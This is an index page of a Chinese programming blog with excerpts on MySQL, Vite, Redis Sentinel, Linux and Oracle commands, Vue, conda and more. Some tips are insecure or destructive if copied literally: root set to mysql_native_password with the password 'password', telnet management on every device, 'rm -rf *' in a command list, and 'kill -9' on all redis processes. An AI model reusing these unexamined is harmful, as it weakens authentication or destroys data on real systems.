<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/859c97e5987d5643b9f44586c751343a/" rel="bookmark">
			MySQL连接sqlyog报错2058解决方案：
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、出现原因：
加密规则发生了改变，在8.0之前用的是mysql_native_password，8.0以后用的是caching_sha2_password。
二、解决办法：
可以更改加密规则。
三、解决方法：
1、首先在CMD登录MySQL中。
mysql -u root -p 2、然后切换到数据库MySQL中。
use mysql; 3、然后更改加密规则并设置密码：
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password'; 4、最后进行刷新就可以了。
flush privileges; 四、最后希望对大家有所帮助！！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8cf7186ad6da1deb2b6185780d7e3dc/" rel="bookmark">
			解决vite打包部署后需手动刷新才能加载新的内容！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先在package.json配置文件中设置版本号，每次打包时更换下版本
然后在入口文件或登录页或路由跳转时增加判断，看具体需要把版本更新判断放在哪！
1、引入package.json
import getVersion from '/package.json' 2、判断版本,使用window.location.reload()重新加载页面
// 版本更新 onBeforeMount(() =&gt; { let version = localStorage.getItem('version') if (version) { if (getVersion.version != version) { localStorage.setItem('version', getVersion.version) // window.location.reload() } } else { localStorage.setItem('version', getVersion.version) // window.location.reload() } }) 经测试：重新部署后可以获取到最新的版本（在不刷新页面的情况下）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1230f0962ec2a707b6c0e5030c6820ce/" rel="bookmark">
			ensp设计校园网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.实现功能 基本实现如下网络核心功能：
(1).三层架构设计
本课题按照三层网络结构(接入层，汇聚层，核心层)进行设计和规划，接入层要求提供较多的网络入口，汇聚层实现对接入层网络的互联，核心层完成校园内部和外部数据的交换，并实现路由和安全功能。
(2).路由模块设计
要求通过RIP和EIGRP路由协议实现选路。
(3).交换模块设计
合理规划虚拟局域网(Vlan)，Vlan之间通过三层路由实现。接入层交换机通过二层交换实现互通。
(4).安全模块设计
要求在路由器上配置访问控制列表(ACL)保证对部分网络区域的拒绝访问(如数据库服务器)。
2.部门vlan划分及IP地址 网络用户
IP网段
网关
所属VLAN
校园财务网络
192.168.10.0/24
192.168.10.254 Vlan10
教学部门
192.168.20.0/24
192.168.20.254
VLAN20
教学楼网络
192.168.30.0/24
192.168.30.254
VLAN30
图书馆网络
192.168.40.0/24
192.168.40.254
VLAN40
中心机房
192.168.50.0/24
192.168.50.254
VLAN50
3.网络拓扑说明 网络采用三层架构进行设计，接入、汇聚、核心出口将各vlan的网关配置在核心上。
4.配置过程 中心机房配置Eth-trunk实现链路冗余，机房的接入到汇聚 、 汇聚到核心 均采用Eth-trunk 学院内网络划分多个vlan，相同部门间能够互访
创建vlan
配置接口相应的vlan
所有用户均为自动获取IP地址
各网关上配置dhcp获取地址
其他vlan配置相同
核心交换机作为用户网关实现vlan间路由
通过SVI接口配置各个vlan网关
出口配置NAT实现地址转换
在学院出口将内网web服务器的80端口映射出去，允许外网用户访问
所有设备均可被telnet远程管理
所有设备配置telnet 用户名密码 设置虚拟接口 进行用户名密码认证
学院财务服务器，只允许财务部访问1、禁止保卫部访问外网
财务服务器 192.168.50.3 只允许财务访问：
五、测试 私信获取 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff00dfcf63b2e7f2258376895779f955/" rel="bookmark">
			关于cuda error:device-side assert triggered的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于cuda error:device-side assert triggered的解决方法 最快捷有效且直接简单的方法！！！ 最快捷有效且直接简单的方法！！！ 从GPU切换到CPU，为什么错了都会明明白白的告诉你。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/217bf7872eb0023f361cd3e1c7167cd6/" rel="bookmark">
			LeetCode 热题 100 - 第1题:两数之和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LeetCode 热题 100 - 第1题:两数之和 原题题目理解普通的解题思路---遍历查找进阶的解题思路---哈希查找 原题 给定一个整数数组 nums和一个整数目标值target，请你在该数组中找出 和为目标值 target的那两个整数，并返回它们的数组下标。
你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。
你可以按任意顺序返回答案。
示例 1：
输入：nums = [2,7,11,15], target = 9
输出： [0,1]
解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1]
示例 2：
输入：nums = [3,2,4], target = 6
输出：[1,2]
示例 3：
输入：nums = [3,3], target = 6
输出：[0,1]
提示：
2 &lt;= nums.length &lt;= 104
-109 &lt;= nums[i] &lt;= 109
-109 &lt;= target &lt;= 109
只会存在一个有效答案
题目理解 这个题目有几个关键点：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/217bf7872eb0023f361cd3e1c7167cd6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6099ed87e73bcd664fa006333a08299b/" rel="bookmark">
			xml schema 详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		xml schema 详解 说明 @author JellyfishMIX - github / blog.jellyfishmix.comLICENSE GPL-2.0 xml 命名空间 在 w3c 的官方说法中，命名空间起到了避免元素命名冲突的作用。这里就不再举例详细说明了，如果要避免重名的冲突，在 xml 中可以使用多个不同的命名空间。 命名空间的语法:
xmlns:namespace-prefix="namespaceURI" 当命名空间声明在元素的开始标签中时，所有带有相同前缀(namespace-prefix)的子元素都会与同一个命名空间相关联，前缀可以看做是命名空间的一个别名。后面 demo 中会理解这一点。 xml schema, xsd, xml 三者间的关系 xml schema 是定义 xml 文件的合法构建模块，可以理解为是一种编写 xsd 或 xml 文件的语法。使用 schema 语法编写的文件后缀名可以是 .xsd 或 .xml。xsd(xml schema definition) 文件，后缀名 .xsd，定义 xml 文件中可以出现哪些元素, 属性, 元素之间的关系, 顺序, 元素的数量, 元素或属性的类型和值的范围等，是对 xml 文件的一种约束方式。xsd 文件也使用 schema 语法编写。总结，xml schema 是语法，可以用来编写 xsd 或 xml 文件。xsd 文件是对 xml 文件的约束，xml 文件中导入 xsd 后就可以使用 xsd 中定义的元素, 属性等。 xsd 文件 demo 属性 targetNamespace=“http://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6099ed87e73bcd664fa006333a08299b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f35b1cefe074de210049292d55b545e6/" rel="bookmark">
			利用已存在的conda环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、已存在的环境
二、在Pycharm中使用这些环境
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d22193472d76a27dfe820fbd58be44f7/" rel="bookmark">
			redis 配置主从复制,哨兵模式案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		哨兵(Sentinel)模式 1 . 什么是哨兵模式？ 反客为主的自动版，能够自动监控master是否发生故障，如果故障了会根据投票数从slave中挑选一个
作为master，其他的slave会自动转向同步新的master，实现故障自动转义
2 . 原理 sentinel会按照指定的频率给master发送ping请求，看看master是否还活着，若master在指定时间内未
正常响应sentinel发送的ping请求，sentinel则认为master挂掉了，但是这种情况存在误判的可能，比
如：可能master并没有挂，只是sentinel和master之间的网络不通导致，导致ping失败。
为了避免误判，通常会启动多个sentinel，一般是奇数个，比如3个，那么可以指定当有多个sentinel都
觉得master挂掉了，此时才断定master真的挂掉了，通常这个值设置为sentinel的一半，比如sentinel
的数量是3个，那么这个量就可以设置为2个
当多个sentinel经过判定，断定master确实挂掉了，接下来sentinel会进行故障转移：会从slave中投票
选出一个服务器，将其升级为新的主服务器， 并让失效主服务器的其他从服务器slaveof指向新的主服务 器；
当客户端试图连接失效的主服务器时， 集群也会向客户端返回新主服务器的地址， 使得集群可以 使用新主服务器代替失效服务器。
操作流程 1. 案例 - 配置1主2从3个哨兵 下面我们来实现1主2从3个sentinel的配置，当从的挂掉之后，要求最少有2个sentinel认为主的挂掉了，才进行故障转移。
为了方便，我们在一台机器上进行模拟，我的机器ip是：192.168.200.129，通过端口来区分6个不同的
节点（1个master、2个slave、3个sentinel），节点配置信息如下
2 . 创建案例工作目录：sentinel 执行下面命令创建 /opt/sentinel 目录，本次所有操作，均在 sentinel 目录进行。
# 方便演示，停止所有的redis ps -ef | grep redis | awk -F" " '{print $2;}' | xargs kill -9 mkdir /opt/sentinel cd /opt/sentinel/ 3 . 将redis.conf复制到sentinel目录 redis.conf 是redis默认配置文件
cp /opt/redis-6.2.1/redis.conf /opt/sentinel/ 4 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d22193472d76a27dfe820fbd58be44f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32ca0131b1db33f9b9f17b7e24de83bc/" rel="bookmark">
			linux中相关问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		linux linux相关常用命令oracle相关问题常用命令ORA-01109: database not open resin相关问题====服务器停止异常：?watchdog没有启动，resin没法正常链接watchdog linux固定ip地址 linux相关常用命令 下载文件命令： 下载该目录下所有文件：sz dir/* 下载单个：sz rc.local 下载某类文件：sz *.sh 上传文件命令：rz 压缩文件夹：tar -cvf classbean.tar ./*:当前目录下所有文件 编译：make 安装：make install 覆盖已存在文件：rz -y 删除文件：rm rm afile 删除文件afile rm * 删除当前目录下的所有文件。 rm -rf domed 删除domed目录以及它所包含的所有内容 rm -i a* 删除当前目录下所有以字母a开头的文件，并且在每次删除时，提示用户进行确认。 --端口被占用： lsof -i:端口号 1、安装yum rpm -ivh --force --nodeps 对应的多个yum安装包 2、查找某个文件全路径 find / -name 文件名 3、解决yum在线安装不了软件问题 yum源文件路径：/etc/yum.repos.d/ 挂载： mount /dev/cdrom /hm 清理：yum clean all 重新缓存：yum makecache 4、修改文件名 sudo mv 原文件名 新文件名 5、删除单个或多个文件 rm 文件名 rm -rf * 6、copy文件 cp 原目录文件 指定文件目录 7、查看版本信息 cat /proc/version 8、查看rpm是否安装成功 rpm -qa | grep 具体软件名称 9、删除目录 rmdir 目录名称 10、创建文件 touch 文件名称 mkdir 目录名称 11、查看挂载目录 df -h oracle相关问题 常用命令 1、连接数据库：su - oracle 2、dba登入：sqlplus / as sysdba 3、服务监听状态：lsnrctl status 4、启动服务:startup 5、进入监控台：lsnrctl ORA-01109: database not open 一般是oracle12c 及以上会出现这种问题.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32ca0131b1db33f9b9f17b7e24de83bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffa2e5a99349027b4ea8166d516fb19b/" rel="bookmark">
			Apache poi xwpf word转PDF中文显示与页码问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
POM依赖
核心配置代码
PDF下载流问题
WPS模板问题
原问题解决方法：https://github.com/opensagres/xdocreport/issues/161
POM依赖 &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;poi.version&gt;3.14&lt;/poi.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi&lt;/artifactId&gt; &lt;version&gt;${poi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt; &lt;version&gt;${poi.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;fr.opensagres.xdocreport&lt;/groupId&gt; &lt;artifactId&gt;fr.opensagres.poi.xwpf.converter.pdf-gae&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;fr.opensagres.xdocreport&lt;/groupId&gt; &lt;artifactId&gt;fr.opensagres.xdocreport.document&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 请记住，word转换如果没问题，那么就要设置pdf的字体，这个是铁律！
核心配置代码 将PdfOptions提出来作为方法使用
private PdfOptions getPdfOptions() { PdfOptions pdfOptions = PdfOptions.create(); // 解决中文不显示问题 pdfOptions.fontProvider(new IFontProvider() { @Override public Font getFont(String familyName, String encoding, float size, int style, Color color) { try { File file = new File(pdfChineseTTF); Preconditions.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffa2e5a99349027b4ea8166d516fb19b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cccd0bbfcd7e7a70698bd1ecb1bfc0c/" rel="bookmark">
			13. 机器学习 - 数据集的处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Training data splitNormalizationStandardizedONE-HOT补充：SOFTMAX 和 CROSS-ENTROPY Hi， 你好。我是茶桁。
上一节课，咱们讲解了『拟合』，了解了什么是过拟合，什么是欠拟合。也说过，如果大家以后在工作中做的就是机器学习的相关事情，那么欠拟合和过拟合就会一直陪伴着你，这两者是相互冲突的。
现在，让我们一起来思考一个问题：overfitting，过拟合产生的原因是什么？
如果这是在模型层面的话，参数过多还是过少？如果从数据层面来看，是过多还是过少呢？
好，我们来揭晓答案。如果模型层面思考，那是就是参数过多。如果从数据层面来看， 那是数据过少。
现在我们需要理解一件事情，这两个事情其实是一回事，数据量多和模型复杂其实是一回事。它背后的原因就是因为任何一个f(x)如果有很多的参数，拟合的时候随着这个参数数量越多，那么我们所需要的训练数据集也要增多。也就是说当模型非常复杂，参数特别多，只要数据量特别大，那就不算多。就说现有的数据量对于参数不够，训练力度不够。
这就好比是有一个天才的孩子，脑子极其聪明，就跟茶桁一样。哎， 这个孩子呢智商极其高，但是他想事情想的特别的复杂，结果他现在见到的事情都是太过于简单的东西。那么就不能把他的这个潜力发挥出来。
好，我们接着下一个问题：如何判断一件事情有没有发生过拟合或者欠拟合呢？
我们看这张图，假如这是一个2分类问题，咱们训练时候结果的准确度是0.7左右。那么大家想一下， 这个是过拟合还是欠拟合呢？
如果模型训练的时候效果还不错，快接近于1了，达到了百分之九十几。但是实际上用validation数据集去测的时候发现准确度下到百分之八十几，或者百分之七十几，总之就是比在训练的时候那个效果要差。这个就叫作过拟合。
咱们上节课给大家说的就是这个问题，机器学习的整个流程最终的目的不是为了把loss函数降到最低，我们要关心的是像recall，precition，这种信息才是最关键的。
Training data split 接下来，咱么要再讲几个机器学习里面极其重要的几个概念，第一个是数据集的切分(Training data split)。第二个是Normalization。第三个，Standardized。
其实上节课，咱们已经说过了数据集的切分问题。数据集切分最主要的原因是因为我们经常会遇见过拟合的情况，为了避免我们把所有的数据拿来不断的做training, 然后在使用的时候效果变得不好，那我们不如自己找一些数据出来做test sets，为了可以反复多次的去检验效果好不好，就增加了一个validation sets。
在真实环境下我们是怎么去做这样一件事呢？我们来简单的演示下：
from sklearn.model_selection import train_test_split import numpy as np sample_data = np.random.random(size(100, 5)) train, test = train_test_split(sample_data, train_size=0.8) train --- array([[1.55582066e-01, 8.19437761e-01, 3.54628257e-02, 5.53248385e-01, 4.23785508e-01], ... [7.24889349e-01, 1.23458057e-01, 9.74101303e-01, 1.72605427e-01, 6.59164912e-01]]) 非常的简单，我们来看，sklearn里自带了这种分割方法。我们随机了100行5列的数据，然后使用train_test_split将其分割成train和test两份，在后面的参数内设置了百分位。
这样，这个数据就做了一个拆分。值得注意的是，给大家教一个小技巧，这是第一种方法：split。其实不只是sklearn， pytorch和keras也都有split方法。
但是我们去看一下源码会发现， 这个split方法是没有validation，它的输出只有train和test两部分。
为了解决这个问题，我们可以用一个简单的方法。这次我们使用Numpy。
indices = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cccd0bbfcd7e7a70698bd1ecb1bfc0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f08e004fdaf71f24bfc2cc908f2b2270/" rel="bookmark">
			mysql学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql 1.下载与安装 下载网址：
mysql下载(选择community社区版)
navicate下载
或者使用idea自带的数据库管理工具
2.常见的设置参数 参数包含含义缓存设置包括key_buffer_size、query_cache_size、innodb_buffer_pool_size等参数用于设置缓存的大小和使用情况。连接设置包括max_connections、wait_timeout、connect_timeout等参数用于设置连接的数量和超时时间日志设置包括log_error、slow_query_log、general_log等参数用于设置错误日志、慢查询日志和一般查询日志等。安全设置包括skip_networking、skip_external_locking、secure_auth等参数用于设置网络连接、外部锁定和安全认证等。存储设置包括innodb_file_per_table、innodb_file_format、innodb_log_file_size等参数用于设置存储引擎的文件格式、日志大小等。 使用这些参数需要在MySQL配置文件中进行设置，一般为my.cnf文件。可以通过以下方式进行设置：
找到my.cnf文件所在的位置，一般在/etc/mysql/或/usr/local/mysql/etc/目录下。打开my.cnf文件，找到需要设置的参数，修改其值。保存my.cnf文件，重启MySQL服务，使设置生效。
例如，设置key_buffer_size为256M，可以在my.cnf文件中添加以下内容： [mysqld] key_buffer_size = 256M 保存文件后，重启MySQL服务即可生效。
3.基础语句 3.1.查询 3.1.1.基础查询
-- 查询整个学生表数据 select * from stdent -- 查询姓名为小白的数据 SELECT * FROM student WHERE name="小白"; 3.1.2.查询在指定区间内数据
-- 从student表中筛选age在20和99之间的，包括起始 SELECT * FROM student WHERE age BETWEEN 20 AND 99; -- 从student表筛选年龄满足（）内任意一项的数据 SELECT * FROM student WHERE age IN (10,20,30); -- 从student表中筛选年龄不满足（）内任意一项的数据 SELECT * FROM student WHERE age NOT in (10,20,30); 3.1.3.查询指定条件的数据
-- 从student中筛选成绩不为空的 SELECT * FROM student WHERE score is NOT NULL; -- and or多条件查询 --从student中筛选性别为女，年龄小于30，并且姓名长度小于3位的数据 SELECT * from student WHERE sex='girl' or (age&lt;30 AND LENGTH(`name`)&lt;&gt;3); 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f08e004fdaf71f24bfc2cc908f2b2270/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ce681867d52d770d14453e59d9d40d7/" rel="bookmark">
			单片机中的 _nop_() 延时以及其相关的基础扩展
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 _nop_() 函数做延时遇到的一些问题 以及对此延伸出的一些需要了解的基本概念 ...... by 矜辰所致 完善文章内容结构，补充指令周期、机器周期等一些基本概念 2023/10/25 前言 最近还是继续做着项目，因为在某 8051 内核芯片上使用到了 I2C 通讯，又需要 _nop_() 函数来实现 us 延时，那么正好来写一篇由_nop_() 函数引起的一系列基本概念 。
本文的内容包括：对 nop 的认识，单片机中的 nop 函数做延时的一些注意事项，以及单片机中基本的指令周期，机器周期等一些基本概念的说明。
我是矜辰所致，全网同名，尽量用心写好每一系列文章，不浮夸，不将就，认真对待学知识的我们，矜辰所致，金石为开！
目录 前言一、 NOP 指令1.1 NOP 指令的作用 二、单片机中的 `_nop_()` 函数2.1 C语言中的 NOP2.2 _nop_ 函数消耗的时间 三、用 `_nop_()` 延时的注意事项3.1 函数调用对延时的影响3.2 调用函数中的语句对延时的影响3.2.1 单片机执行一条指令所需要的时间 四、指令周期、机器周期、时钟周期结语 一、 NOP 指令 _nop_() 函数产生的是 NOP 指令，先来简单介绍一下 NOP 指令，基本介绍走个流程把：
NOP 是编程语言中一个经常用到的指令，它的全称是 No Operation，即无操作指令。
NOP 是汇编语言中的一个伪指令，通过NOP一系列的编程语句，能够不改变任何程序可以访问的寄存器。
1.1 NOP 指令的作用 我们知道，指令、数据对齐可以有效地提高程序的性能， 使用 NOP 指令，可以使得指令按字对齐，从而提高效率 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ce681867d52d770d14453e59d9d40d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd4df0072b6e13c0294ec2dfc8c36d92/" rel="bookmark">
			简单实现学院球队转会
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介： 要创建一个能够录入球员、查看各个学院赛程以及执行球员转会的网页，你需要进行一系列步骤，包括前端和后端开发。以下是一个简单示例，使用Python的Flask框架和HTML来实现这个功能：
1.设置环境和安装Flask： (1)安装虚拟环境工具： python3 -m venv myenv
这将在当前目录创建一个myenv的虚拟环境\
(2)激活虚拟环境 myenv\Scripts\activate
这是在Windows中的命令
(3)安装flask pip install flask
(4)检验 python import flask flask.__version__ 2.创建flask应用 (1)创建一个名为app.py的文件 python Copy code from flask import Flask, render_template, request, redirect, url_for app = Flask(__name__) # 创建一个空的球员列表和学院赛程 players = [] schedules = { 'College A': ['Match 1', 'Match 2', 'Match 3'], 'College B': ['Match 4', 'Match 5', 'Match 6'], # 添加更多学院和赛程 } @app.route('/') def home(): return render_template('index.html', players=players, schedules=schedules) @app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd4df0072b6e13c0294ec2dfc8c36d92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/956875c39a6352c74973010b291a380a/" rel="bookmark">
			Datax数据同步支持SqlServer 主键自增与非自增
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
允许自增
允许写入的SQL
Datax写入插件处理
不允许自增
表注意事项
存储过程
SqlServer 在自增处理上跟MySQL这种处理有所区别，对于不通的数据处理场景需求需要区别对待。自增会导致ID来源和目标不一致 而非自增有需要对表进行处理。
允许自增 允许写入的SQL SET IDENTITY_INSERT table_name ON; -- 插入数据，指定主键值 INSERT INTO table_name (id, column1, column2, ...) VALUES (new_id_value, value1, value2, ...); SET IDENTITY_INSERT table_name OFF; Datax写入插件处理 核心类：com.alibaba.datax.plugin.rdbms.writer.CommonRdbmsWriter
protected void doBatchInsert(Connection connection, List&lt;Record&gt; buffer) throws SQLException { PreparedStatement preparedStatement = null; Statement statementIdentify = null; try { statementIdentify = connection.createStatement(); statementIdentify.execute(String.format("SET IDENTITY_INSERT %s ON", table)); connection.setAutoCommit(false); preparedStatement = connection .prepareStatement(this.writeRecordSql); for (Record record : buffer) { preparedStatement = fillPreparedStatement( preparedStatement, record); preparedStatement.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/956875c39a6352c74973010b291a380a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8988eb42fa8bb3ee4971822f292dd35e/" rel="bookmark">
			Vue 面试题复习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue 面试题 1. 什么是 Vue.js？ Vue.js 是一款流行的前端 JavaScript 框架，用于构建用户界面。它采用了组件化的开发方式，使得前端开发更加模块化、可复用和易于维护。
2. Vue.js 的特点是什么？ 响应式数据绑定：Vue.js 使用双向数据绑定机制，当数据发生变化时，视图会自动更新。组件化开发：Vue.js 支持将页面拆分为多个组件，每个组件具有独立的逻辑和样式，便于复用和维护。虚拟 DOM：Vue.js 使用虚拟 DOM 技术，通过比较虚拟 DOM 的差异来高效更新真实 DOM。指令系统：Vue.js 提供了丰富的指令（如 v-if、v-for、v-bind 等），用于操作 DOM 元素。插件化扩展：Vue.js 可以通过插件的形式扩展其功能，提供更多的特性和工具。 3. Vue.js 的生命周期钩子函数有哪些？ Vue.js 组件有以下生命周期钩子函数：
beforeCreate：在实例创建之前调用。created：在实例创建完成后调用，可以进行数据初始化等操作。beforeMount：在挂载开始之前调用。mounted：在挂载完成后调用，可以访问到 DOM 元素。beforeUpdate：在数据更新之前调用。updated：在数据更新完成后调用。beforeDestroy：在实例销毁之前调用。destroyed：在实例销毁后调用。 4. Vue.js 中的路由是如何实现的？ Vue.js 使用 Vue Router 来实现前端路由。通过定义路由表，将 URL 和对应的组件关联起来，实现页面的切换和导航。
5. Vue.js 的双向数据绑定是如何实现的？ Vue.js 使用了数据劫持和观察者模式来实现双向数据绑定。当数据发生变化时，Vue.js 会自动更新视图；同时，当用户与视图交互时，Vue.js 也会自动更新数据。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e5cca5798f4e6e0e6ac67cefff24a94/" rel="bookmark">
			Maven历史版本下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 网址: https://archive.apache.org/dist/maven/maven-3/3.8.6/binaries/ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98c43ff1eb20431f4fafe07ba1fb6426/" rel="bookmark">
			anaconda创建不同的python环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 conda create --name python27 python=2.7 #列出当前安装的所有python 环境 conda info -e #当前环境 python -V #创建环境 conda create --name python27 python=2.7 #激活环境 conda activate python27 #切换之前的环境 conda deactivate #删除已经有的环境 conda remove --name python27 --all 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb54268a7c2f93bcde255dfdad983dcf/" rel="bookmark">
			Windows环境部署流媒体服务器ZLMediaKit
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考资料 快速开始 · ZLMediaKit/ZLMediaKit Wiki · GitHub
环境准备 序号名称版本作用下载地址1Microsoft Visual Studio链接：https://pan.baidu.com/s/1DoWjNZ72Y8YpGpSTY0CNKw 提取码：pv6a2opensslWin32/Win64 OpenSSL Installer for Windows - Shining Light Productionscmake https://github.com/Kitware/CMake/releases/download/v3.17.0-rc3/cmake-3.17.0-rc3-win64-x64.zip 3ffmpegDownload FFmpeg4faac5mp4v27SDL2 软件准备 1、openssl安装 下载软件
下载exe文件， 点击安装
安装完成后配置环境变量
OPENSSL_HOME:D:\Program Files\OpenSSL-Win64
Path
查看版本
openssl version
2、ffmpeg安装 下载ffmpeg
Download FFmpeg
ffmpeg安装成功
error C1128: 节数超过对象文件格式限制: 请使用 /bigobj 进行编译
在 Visual Studio 开发环境中设置此编译器选项
打开该项目的“属性页”对话框
单击“C/C++”项。
单击“命令行”属性页。
在“附加选项”框中键入编译器选项,添加 /bigobj
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a190edf87a57f587edc6ff3b613cf5da/" rel="bookmark">
			python 小案例106
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面是一个使用Python实现二项分布和泊松分布的代码案例及步骤解释：
步骤1：导入所需的库
import numpy as np import matplotlib.pyplot as plt from scipy.stats import binom, poisson 步骤2：定义参数
